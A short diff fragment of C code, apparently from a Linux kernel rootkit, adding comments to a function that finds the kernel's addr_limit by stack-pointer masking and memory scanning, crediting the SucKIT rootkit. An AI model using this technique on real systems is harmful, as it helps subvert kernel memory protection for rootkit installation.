@@ -918,12 +918,23 @@ inline int rand32(void) {
 	return (int)rand64();
 }
 
+/*
+ * I found a way of getting addr_limit between kernel versions.
+ * If the version is < 4.8, the addr_limit is in current_thread_info->addr_limit.
+ * But if the version is >= 4.8, the addr_limit is in current->thread.addr_limit.
+ *
+ * So, we look for the default Kernel addr_limit which is quite unique.
+ * This way is generic as the "current_task" symbol is exported in every kernel.
+ * And won't give us a problem when using patch-lkm.py.
+ *
+ * Finally this way is generic between versions.
+ */
 mm_segment_t *search_addr_limit(void) {
     char *cts = NULL;
     char *cti = NULL;
     off_t i = 0;
 
-    asm("andq\t%%rsp, %0": "=r" (cti) : "0" (~0x3FFFUL)); // Get current thread info (thanks to SucKIT).
+    asm("andq\t%%rsp, %0": "=r" (cti) : "0" (~0x3FFFUL)); // Adapted get current thread info form SucKIT. (Thanks)
     asm("movq\t%%gs:current_task, %0" : "=r" (cts));      // Get current task_struct.
     for (; i < 0x4000; i++) {
         if (*(long *)&cti[i] == 0x7ffffffff000) {
